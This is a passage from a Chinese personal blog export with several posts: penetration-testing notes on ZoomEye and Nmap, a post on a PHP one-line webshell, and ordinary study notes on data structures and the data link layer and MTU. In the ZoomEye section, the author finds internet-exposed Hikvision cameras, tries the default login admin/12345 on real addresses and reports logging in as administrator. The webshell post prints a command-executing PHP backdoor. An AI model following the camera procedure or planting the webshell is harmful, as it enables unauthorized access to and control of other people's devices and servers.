<li>神奇的搜索引擎：<code>ZoomEye</code>、shodan（支持公网设备指纹检索和 Web (网站)指纹检索）</li>
</ul>
<h2 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h2><blockquote>
<p>主动信息收集是指通过各种工具直接对往网站进行检测。直接使用工具对网站进行信息探测可以获得较多较全的信息，但是可能会被目标主机发现，对你的可疑行为进行记录，分析，可能会对后期的渗透工作产生影响。</p>
</blockquote>
<p>可见，没有一种方式可以做到面面俱到，每个方式都有自己的优势和劣势，作为一名合格的渗透测试人员，我们要学会各种工具搭配使用，取长补短，对目标进行多次隐秘而有效的探测，获得自己想要的信息，完成对目标网站完整的信息收集报告。</p>
<h1 id="zoomeye的讲解与实操"><a href="#zoomeye的讲解与实操" class="headerlink" title="zoomeye的讲解与实操"></a>zoomeye的讲解与实操</h1><h2 id="zoomeye的讲解"><a href="#zoomeye的讲解" class="headerlink" title="zoomeye的讲解"></a>zoomeye的讲解</h2><p>ZoomEye搜索引擎支持<strong>关键词检索</strong>，可以快速搜索到我们需要的数据。</p>
<ul>
<li>app：组件名称  ver：组件版本</li>
<li>app:apache ver:2.4   搜索 apache 2.4</li>
<li>port:搜索端口号 port:22  搜索开放了SSH端口的主机</li>
<li>OS:搜索指定的操作系统 OS:linux</li>
<li>service：服务名称 Service:SSH   搜索SSH服务</li>
<li>country：国家名   city：城市名  country:China    city: Beijing</li>
<li>Device：搜索指定的设备类型，divice:router</li>
<li>ip:搜索特定的IP地址，ip:192.168.1.1</li>
<li>cidr：指定的CIDR网段   CIDR：192.168.158.12&#x2F;24</li>
<li>Service：搜索指定的服务类型，service:http</li>
<li>Hostname:guet.edu.cn</li>
</ul>
<h2 id="zoomeye的数据操作"><a href="#zoomeye的数据操作" class="headerlink" title="zoomeye的数据操作"></a>zoomeye的数据操作</h2><blockquote>
<p>这里以海康威视的摄像头进行演示</p>
</blockquote>
<p><strong>第一步：打开zoomeye，并输入关键词DVRDVS-Webs进行检索</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109095950716.png" alt="image-20231109095950716"></p>
<p><strong>第二步：打开搜索到的地址</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100001437.png" alt="image-20231109100001437"><br>看你看见其ip地址</p>
<p><strong>第三步：连接80端口</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100011514.png" alt="image-20231109100011514"><br>因为web服务的默认端口为80，所以打开后极有可能是登录界面</p>
<p><strong>第四步：弱口令测试</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100020560.png" alt="image-20231109100020560"><br>一般海康威视的摄像头管理员：账号：admin  密码：12345。这里我们进行测试</p>
<p><strong>第五步：是否成功？</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100033068.png" alt="image-20231109100033068"><br>在尝试的5、6个地址后成功以管理员身份登录。因为隐私保护，测试到此为止。</p>
<h1 id="Nmap的讲解与实操"><a href="#Nmap的讲解与实操" class="headerlink" title="Nmap的讲解与实操"></a>Nmap的讲解与实操</h1><blockquote>
<p>可以进行主动扫描的工具很多，但是最为优秀的一定是Nmap。</p>
</blockquote>
<h2 id="Nmap的功能"><a href="#Nmap的功能" class="headerlink" title="Nmap的功能"></a>Nmap的功能</h2><blockquote>
<p>主机发现功能、端口扫描功能、服务及版本检测功能、操作系统检测功能+实现一些高级的审计技术。<br>也就是，通过Nmap对一台计算机进行审计的话，可以获取<strong>以下信息</strong>：</p>
</blockquote>
<ol>
<li>目标主机是否在线，所在的网络结构</li>
<li>开放的端口：80端口、135端口、443端口</li>
<li>目标主机所使用的操作系统：Win7、Linux、Android…</li>
<li>目标主机上运行的服务及其版本：Apache httpd、OpenSSH、Debian…</li>
<li>目标主机上所存在的漏洞：弱口令、ms08_067…</li>
</ol>
<h2 id="Nmap的基本用法"><a href="#Nmap的基本用法" class="headerlink" title="Nmap的基本用法"></a>Nmap的基本用法</h2><ol>
<li>对单个主机进行扫描<blockquote>
<p>使用命令： <code>nmap 扫描地址</code>（ip或者域名）</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100042809.png" alt="image-20231109100042809"><br>可以看见，通过nmap指令对目标进行扫描，可以得到以上信息。<br>在这些信息中我们要重点关注第6行及其之后的信息，那里显示了我们扫描的主机的端口状态及其开放情况。</p>
<hr>
<ol start="2">
<li>对多个不连续的主机进行扫描<blockquote>
<p>命令语法： <code>nmap [扫描目标1 扫描目标2 ...... 扫描目标n]</code></p>
</blockquote>
</li>
</ol>
<p>显示内容与上同，只是会分开显示，同时会给出扫描主机的在线情况。</p>
<hr>
<ol start="3">
<li>对连续范围内的主机进行扫描<blockquote>
<p>命令语法: nmap [IP地址的范围]</p>
</blockquote>
</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100051767.png" alt="image-20231109100051767"></p>
<blockquote>
<p>ps:可以通过添加<code>-sn</code>参数提高扫描速度，其作用是只扫描在线的主机。</p>
</blockquote>
<hr>
<ol start="4">
<li>对整个子网进行扫描<blockquote>
<p>命令语法: <code>nmap [IP地址/掩码位数]</code></p>
</blockquote>
</li>
</ol>
<p>知道了ip地址与掩码位数，通过与运算可以得到ip的网络号与子网网络号。</p>
<h2 id="使用Nmap-进行主机发现"><a href="#使用Nmap-进行主机发现" class="headerlink" title="使用Nmap 进行主机发现"></a>使用Nmap 进行主机发现</h2><blockquote>
<p>当我们测试的目标是一个网络时，需要知道其中在线的主机。主机发现技术就是用来实现这个前提目标。</p>
</blockquote>
<p>nmap进行主机发现的常用方法：</p>
<ul>
<li>跳过ping扫描阶段 <code> namp –PN [目标]</code></li>
<li>仅使用ping协议进行主机发现 <code>namp –sP [目标]</code></li>
<li>使用ARP协议进行主机发现 <code>namp –PR [目标]  同一子网的目标</code></li>
<li>使用TCP协议进行主机发现 <code>namp –sS [目标]</code></li>
<li>使用UDP协议进行主机发现 <code>namp –sU [目标]</code></li>
</ul>
<blockquote>
<p>这里给出上述几种扫描方式的补充：</p>
<blockquote>
<ul>
<li>使用ARP协议进行主机发现仅适用于与所扫描主机在同一个子网的情况。</li>
<li>使用TCP协议进行主机发现可以分为全开扫描（<code>-sT</code>)和半开扫描（<code>-sS</code>),一般使用半开扫描，耗时短且不易被发现。</li>
<li>使用UDP协议进行主机扫描的方法不常用，耗时较多。</li>
</ul>
</blockquote>
</blockquote>
<h2 id="使用Nmap进行端口发现"><a href="#使用Nmap进行端口发现" class="headerlink" title="使用Nmap进行端口发现"></a>使用Nmap进行端口发现</h2><blockquote>
<p>我们知道，一台计算机可以进行多种网络服务，其原因便在于端口的使用。每一个端口对应一种网络服务，所以我们想自由出入目标，就要知道端口的开放情况。</p>
</blockquote>
<p><em><strong>端口状态的5种</strong></em></p>
<ul>
<li>Open：开放，应用程序在此端口接收TCP或UDP报文。</li>
<li>Closed：关闭，关闭的端口也是可以访问的，会接收nmap的探测报文并做出回应，只有没有应用程序进行监听端口。</li>
<li>Filtered：防火墙过滤探测报文，由于防火墙把我们的探测报文进行过滤，所以我们无法知道端口的状态。</li>
<li>unfiltered：未被过滤状态表示可以访问，但是nmap无法确定其开放情况。</li>
<li>open|filtered：无法确定端口是开放还是被过滤，比如：端口不响应。</li>
</ul>
<ol>
<li><p>扫描全部端口</p>
<blockquote>
<p>命令语法： <code>nmap -p  “*” IP地址</code></p>
</blockquote>
</li>
<li><p>扫描使用频率最高的端口</p>
<blockquote>
<p>命令语法：<code>nmap --top-ports n [目标]</code></p>
</blockquote>
</li>
<li><p>扫描指定端口</p>
<blockquote>
<p>命令语法：<code>nmap -p [端口号][目标]</code></p>
</blockquote>
</li>
</ol>
<p><img src="/./images/1634969165406.png" alt="三个例子"></p>
<h2 id="使用nmap扫描目标操作系统"><a href="#使用nmap扫描目标操作系统" class="headerlink" title="使用nmap扫描目标操作系统"></a>使用nmap扫描目标操作系统</h2><blockquote>
<p>通过想目标发送探针，而后根据目标的会有来猜猜系统。</p>
</blockquote>
<blockquote>
<p>命令语法：<code>nmap -O [目标地址]</code></p>
</blockquote>
<hr>
<h2 id="使用NMAP扫描目标操作系统"><a href="#使用NMAP扫描目标操作系统" class="headerlink" title="使用NMAP扫描目标操作系统"></a>使用NMAP扫描目标操作系统</h2><p>对目标进行渗透的时候，尽量检测出目标系统运行的各种软件。<br>端口：80  well-known  知名端口、熟知端口  对应什么服务？<br>应该掌握哪些知名端口呢？</p>
<ul>
<li>sqlserver默认端口号为：1433</li>
<li>mysql      默认端口号为：3306</li>
<li>oracle    默认端口号为：1521</li>
</ul>
<blockquote>
<p>命令语法：<code>nmap -sV [目标地址]</code></p>
</blockquote>
<h2 id="nmap的后话"><a href="#nmap的后话" class="headerlink" title="nmap的后话"></a>nmap的后话</h2><p>nmap无疑是一个很强大的扫描工具，其功能也不只是上面介绍的几种。<br>想要继续深入了解学习nmap的使用：</p>
<ul>
<li>namp脚本：<a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></li>
<li>NMAP工控分析： <a href="http://plcscan.org/blog/">http://plcscan.org/blog/</a></li>
<li>《诸神之眼——nmap网络安全审计技术揭秘》</li>
</ul>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>一句话木马</title>
    <url>/2023/03/29/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马?"></a>什么是一句话木马?</h1><p>简单来说一句话木马就是通过向服务端提交一句简短的代码来达到向服务器插入木马并最终获得webshell的方法。对于不同的语言有不同的构造方法，基本构造是首先出现的是脚本开始的标记，后边跟着的 eval 或者是 execute 是核心部分，就是获取并执行后边得到的内容，而后边得到的内容，是 request 或者是 $ POST 获取的值。如果我们通过客户端向服务器发送，那么就会让服务器执行我们发送的脚本，挂马就实现了。</p>
<blockquote>
<p>这里我们测试利用的一句话木马为：<br><code>&lt;?php system($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p>
</blockquote>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><strong>Kali-Linux2</strong>  ：一句话木马的部署</p>
<p><strong>ubuntu16.04</strong>：攻击机，对靶机进行访问l利用</p>
<h2 id="一句话木马的部署"><a href="#一句话木马的部署" class="headerlink" title="一句话木马的部署"></a>一句话木马的部署</h2><p><strong>1、在目录<code>/var/www/html</code>  下新建一个php文件，文件内容为上一句话木马。</strong></p>
<p><strong>2、使用 <code>service apache2 start</code>  开启阿帕奇服务</strong></p>
<p><strong>3、查看开启的服务</strong><br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100731140.png" alt="image-20231109100731140"><br><strong>扩展：什么是apache?</strong></p>
<blockquote>
<p>Apache(音译为阿帕奇)是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。<br>在Kali-Linux2中，apache服务的默认存储位置为<code>/var/www/html/</code>,即输入URL时不需要输入这个地址</p>
</blockquote>
<h2 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h2><blockquote>
<p>在ubuntu进行连接利用即可，二者在一个子网当中。</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100740496.png" alt="image-20231109100740496"></p>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始学习算法-概述</title>
    <url>/2023/01/26/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：开始算法的学习，基本的<strong>学习顺序</strong>如下：</p>
<blockquote>
<p><strong>数据结构</strong>部分：花费3天时间，将基本的数据结构了解一下，包括C++和python的实现代码。<br><strong>算法部分</strong>：根据AcWing的视频进行学习，整理好模板<br><strong>题目部分</strong>：在学习后进行刷题，整理题型和优解</p>
</blockquote>
</blockquote>
<p>下面介绍一下学习的整体框架，为后面具体的学习和实践打好基础。</p>
<h1 id="数据结构的基本概念"><a href="#数据结构的基本概念" class="headerlink" title="数据结构的基本概念"></a>数据结构的基本概念</h1><h2 id="基本概念和术语"><a href="#基本概念和术语" class="headerlink" title="基本概念和术语"></a>基本概念和术语</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672834978998.png"></p>
<h2 id="数据结构三要素"><a href="#数据结构三要素" class="headerlink" title="数据结构三要素"></a>数据结构三要素</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835020979.png"></p>
<h1 id="算法和算法评价"><a href="#算法和算法评价" class="headerlink" title="算法和算法评价"></a>算法和算法评价</h1><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835072091.png"></p>
<p><strong>注</strong>：算法是求解问题的一种步骤描述，但是一个问题往往有很多解法，对此要学会对算法进行优化。在实际的算法比赛里也是根据通过的数据量判断成绩，所以算法的效率很关键。</p>
<h1 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1><h2 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835236083.png"></p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835309481.png"><br><strong>注</strong>：对于算法的代码实现时，函数的命名要有具体含义，便于理解。</p>
<h2 id="线性表的顺序表示"><a href="#线性表的顺序表示" class="headerlink" title="线性表的顺序表示"></a>线性表的顺序表示</h2><h3 id="顺序表的定义"><a href="#顺序表的定义" class="headerlink" title="顺序表的定义"></a>顺序表的定义</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835415993.png"></p>
<h3 id="顺序表的基本操作"><a href="#顺序表的基本操作" class="headerlink" title="顺序表的基本操作"></a>顺序表的基本操作</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835441644.png"></p>
<h2 id="线性表的链式表示"><a href="#线性表的链式表示" class="headerlink" title="线性表的链式表示"></a>线性表的链式表示</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835497439.png"><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835513105.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835539597.png"></p>
<h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835568354.png"></p>
<h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835588780.png"></p>
<h3 id="静态链表"><a href="#静态链表" class="headerlink" title="静态链表"></a>静态链表</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835614254.png"></p>
<h3 id="顺序表与链表比较"><a href="#顺序表与链表比较" class="headerlink" title="顺序表与链表比较"></a>顺序表与链表比较</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835644751.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835660176.png"></p>
<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="栈的基本概念"><a href="#栈的基本概念" class="headerlink" title="栈的基本概念"></a>栈的基本概念</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835693659.png"></p>
<h2 id="栈的顺序存储结构"><a href="#栈的顺序存储结构" class="headerlink" title="栈的顺序存储结构"></a>栈的顺序存储结构</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835728841.png"></p>
<h2 id="栈的链式存储结构"><a href="#栈的链式存储结构" class="headerlink" title="栈的链式存储结构"></a>栈的链式存储结构</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835757113.png"></p>
<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h2 id="队列的基本概念"><a href="#队列的基本概念" class="headerlink" title="队列的基本概念"></a>队列的基本概念</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835780536.png"></p>
<h2 id="队列的顺序存储结构"><a href="#队列的顺序存储结构" class="headerlink" title="队列的顺序存储结构"></a>队列的顺序存储结构</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835814799.png"></p>
<h2 id="队列的链式存储结构"><a href="#队列的链式存储结构" class="headerlink" title="队列的链式存储结构"></a>队列的链式存储结构</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835847563.png"></p>
<h2 id="双端队列"><a href="#双端队列" class="headerlink" title="双端队列"></a>双端队列</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835878565.png"></p>
<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="树的基本概念"><a href="#树的基本概念" class="headerlink" title="树的基本概念"></a>树的基本概念</h2><h3 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672835989039.png"></p>
<h3 id="基本术语"><a href="#基本术语" class="headerlink" title="基本术语"></a>基本术语</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836015384.png"></p>
<h3 id="树的性质"><a href="#树的性质" class="headerlink" title="树的性质"></a>树的性质</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836037137.png"></p>
<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="定义与主要特性"><a href="#定义与主要特性" class="headerlink" title="定义与主要特性"></a>定义与主要特性</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836081111.png"></p>
<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836105129.png"></p>
<h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="图的定义"><a href="#图的定义" class="headerlink" title="图的定义"></a>图的定义</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836301651.png"></p>
<h2 id="图的存储与基本结构"><a href="#图的存储与基本结构" class="headerlink" title="图的存储与基本结构"></a>图的存储与基本结构</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836360821.png"></p>
<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836389208.png"></p>
<h2 id="图的应用"><a href="#图的应用" class="headerlink" title="图的应用"></a>图的应用</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836415641.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836442462.png"></p>
<h1 id="散列表"><a href="#散列表" class="headerlink" title="散列表"></a>散列表</h1><h2 id="散列表的基本概念"><a href="#散列表的基本概念" class="headerlink" title="散列表的基本概念"></a>散列表的基本概念</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836477114.png"></p>
<h2 id="散列函数的构造"><a href="#散列函数的构造" class="headerlink" title="散列函数的构造"></a>散列函数的构造</h2><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1672836501053.png"></p>
<hr>
<blockquote>
<p><strong>写在最后</strong>：上面只是对数据结构进行一些基本的介绍和整理，在整体上有一个印象。还需要深入的学习和实践才可以真正掌握。同时数据结构是算法的基础，要在掌握基本数据结构的基础上进行算法的学习和实践。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的计网学习-数据链路层</title>
    <url>/2023/01/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：本篇文章的主要资料来源为<code>《[公众号蓝蓝考研]计算机网络背诵版》</code>，同时会在遇到重点问题时广泛收集网上资料，使得记录更加详细。本次整理仅用于个人学习。</p>
</blockquote>
<hr>
<p>老规矩，先来看一下数据链路层的考点：</p>
<ul>
<li>基本概念</li>
<li>差错控制</li>
<li>流量控制</li>
<li>介质访问控制</li>
<li>局域网与广域网</li>
<li>链路层设备</li>
</ul>
<p><strong>注</strong>：数据链路层是计算机网络中很核心的一部分，所以涉及到的<strong>知识点很多，考点也多</strong>。同时因为数据链路层是既与通信相关，又有很多计网相关的协议，所以属于<strong>承上启下的一层</strong>。</p>
<hr>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="数据链路层的基本概念"><a href="#数据链路层的基本概念" class="headerlink" title="数据链路层的基本概念"></a>数据链路层的基本概念</h3><blockquote>
<p>数据链路层负责通过一条链路从一个节点向另一个物理链路<strong>直接相连的相邻节点</strong>传输数据报</p>
</blockquote>
<p>其中：</p>
<ul>
<li><strong>节点</strong>：主机、路由器等</li>
<li><strong>链路</strong>：网络中两个节点之间的物理通道，链路的传输介质有双绞线、光纤、微波等，分为有线链路和无线链路。</li>
<li><strong>帧</strong>：链路层的协议数据单元，封装网络层数据报。</li>
</ul>
<h3 id="数据链路层的功能"><a href="#数据链路层的功能" class="headerlink" title="数据链路层的功能"></a>数据链路层的功能</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186771336.png"></p>
<h3 id="组帧"><a href="#组帧" class="headerlink" title="组帧"></a>组帧</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673186830736.png"></p>
<h4 id="封装成帧与透明传输"><a href="#封装成帧与透明传输" class="headerlink" title="封装成帧与透明传输"></a>封装成帧与透明传输</h4><blockquote>
<p>封装成帧</p>
</blockquote>
<p>封装成帧就是在一段数据的前后部分添加<strong>首部和尾部</strong>，这样就<strong>构成了一个帧</strong>。接收端在接收到<strong>物理层上交</strong>的比特流后就可以根据首部和尾部的标记，从收到的比特流中<strong>识别帧的开始和结束</strong>。</p>
<p>首部和尾部包含许多控制信息，其中<strong>帧定界符</strong>的作用就是确定帧的界限。</p>
<p>考虑到差错控制等多种因素，每一种数据链路层协议都规定了帧的<strong>数据部分的长度上限</strong>，即<strong>最大传送单元MTU</strong>。</p>
<hr>
<p><strong>扩展</strong>：MTU的相关知识(参考文章：<a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/MTU.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/MTU.html</a>)</p>
<blockquote>
<p><strong>什么是MTU?</strong></p>
</blockquote>
<p><strong>最大传输单元MTU</strong>（Maximum Transmission Unit，MTU），是指<strong>网络能够传输的最大数据包大小</strong>，以<strong>字节为单位</strong>。MTU的大小决定了发送端一次能够发送报文的最大字节数。如果MTU超过了接收端所能够承受的最大值，或者是超过了发送路径上途经的某台设备所能够承受的最大值，就会造成报文分片甚至丢弃，加重网络传输的负担。如果太小，那实际传送的数据量就会过小，影响传输效率。</p>
<blockquote>
<p>**为什么要有MTU?**（MTU的作用）</p>
</blockquote>
<p>网络中通常以<strong>数据包为单位</strong>进行信息传递，那么，一次传送多大的包合适、多大的包<strong>最高效</strong>就成为一个核心问题之一。如果<strong>包大小设置的很大</strong>，意味着报文中的有效数据也更多，通信效率更高，但传送一个数据包的延迟也越大，数据包中bit位发生错误的概率也越大。并且如果这个报文丢掉了，重传的代价也很大。如果<strong>包大小设置的过小</strong>，则意味传输相同的数据量，设备需要处理更多的报文，这样会极大的考验设备的线速转发能力。通过设置MTU来调节网络上数据包的大小，<strong>让不同的网络找到最适宜的MTU从而提高转发效率，这就是MTU的作用。</strong></p>
<blockquote>
<p><strong>MTU是一个确定的值吗？</strong></p>
</blockquote>
<p>MTU是数据链路层的概念，指数据链路层对数据帧长度的限制。<strong>不同链路介质类型的网络有不同的默认MTU值</strong>，以下是一些常见网络的默认值：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673171282514.png"></p>
<blockquote>
<p>为什么以太网的MTU通常设置为1500</p>
</blockquote>
<p>RFC标准定义<strong>以太网的默认MTU值为1500</strong>。那么这1500的取值是怎么来的呢？</p>
<p>早期的以太网使用<strong>共享链路</strong>的工作方式，为了<strong>保证CSMA&#x2F;CD（载波多路复用&#x2F;冲突检测）机制</strong>，所以规定了以太帧长度<strong>最小为64字节，最大为1518字节</strong>。最小64字节是为了<strong>保证最极端的冲突能被检测到</strong>，64字节是能被检测到的最小值；最大不超过1518字节是为了<strong>防止过长的帧传输时间过长</strong>而占用共享链路太长时间导致其他业务阻塞。所以规定以太网帧大小为64~1518字节，虽然技术不断发展，但协议一直没有更改。</p>
<p>以太网最大的数据帧是1518字节，这样<strong>刨去帧头14字节和帧尾CRC校验部分4字节，那么剩下承载上层IP报文的地方最大就只有1500字节</strong>，这个值就是以太网的默认MTU值。这个MTU就是网络层协议非常关心的地方，因为网络层协议比如IP协议会根据这个值来<strong>决定是否把上层传下来的数据进行分片</strong>，如果单个IP报文长度大于MTU，则会在发送出接口前被分片，被切割为小于或等于MTU长度的IP包。</p>
<blockquote>
<p>MTU的示意图</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1673171442822.png"></p>
<p>如图所示，<strong>IP数据报的长度就是MTU的长度</strong>。但是实际上，<strong>不同的厂商，甚至同一厂商的不同产品型号对MTU的定义也不尽相同</strong>，通常分为以下几种：</p>
<ul>
<li>MTU用以<strong>指示整个IP报文的最大长度</strong>（IP头+三层Payload），MTU是一个三层的定义，即MTU &#x3D; IP MTU。例如在Huawei NetEngine系列路由、CloudEngine系列交换机上，MTU是三层的定义，指<strong>IP MTU</strong>。</li>
<li>MTU的值等于<strong>IP报文与以太帧头的总和</strong>，即MTU &#x3D; IP MTU + 14字节。例如在Cisco部分设备上，MTU是指IP MTU + 以太帧头。</li>
